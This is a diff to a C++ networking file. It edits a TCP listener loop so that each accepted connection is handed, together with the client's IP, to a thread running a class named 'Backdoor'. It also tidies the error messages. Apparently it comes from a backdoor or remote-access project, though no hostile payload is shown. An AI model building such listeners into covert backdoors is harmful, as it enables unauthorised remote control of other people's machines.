@@ -58,13 +58,13 @@ void Communication::listen_forever(){
 
     // Creating socket file descriptor
     if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0){
-        Error::log_error("socket failed");
+        Error::log_error("Error : socket failed");
     }
     
     // Forcefully attaching socket to the port 8080
     if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
                                                 &opt, sizeof(opt))){
-        Error::log_error("setsockopt");
+        Error::log_error("Error : setsockopt");
     }
 
     address.sin_family = AF_INET;
@@ -74,11 +74,11 @@ void Communication::listen_forever(){
     // Forcefully attaching socket to the port 8080
     if (bind(server_fd, (struct sockaddr *)&address, 
                                 sizeof(address))<0){
-        Error::log_error("bind failed");
+        Error::log_error("Error : bind failed");
     }
 
     if (listen(server_fd, MAX_CONNECTIONS) < 0){
-        Error::log_error("listen");
+        Error::log_error("Error : listen");
     }
 
 
@@ -86,15 +86,19 @@ void Communication::listen_forever(){
 
         if ((new_socket = accept(server_fd, (struct sockaddr *)&address, 
                         (socklen_t*)&addrlen))<0){
-            Error::log_error("accept");
+            Error::log_error("Error : accept");
         }
 
-        
-        threads.push_back(std::thread(Backdoor(new_socket, this, true)));
-        
+        char * client_ip = inet_ntoa(address.sin_addr);
+        int port = ntohs(address.sin_port);
+
+        this->threads.push_back(std::thread(Backdoor(new_socket, this, true, client_ip)));
         this->sockets.push_back(new_socket);
     }
-    
+
+    for (auto &t : this->threads){
+        t.join();
+    }
 }
 
 
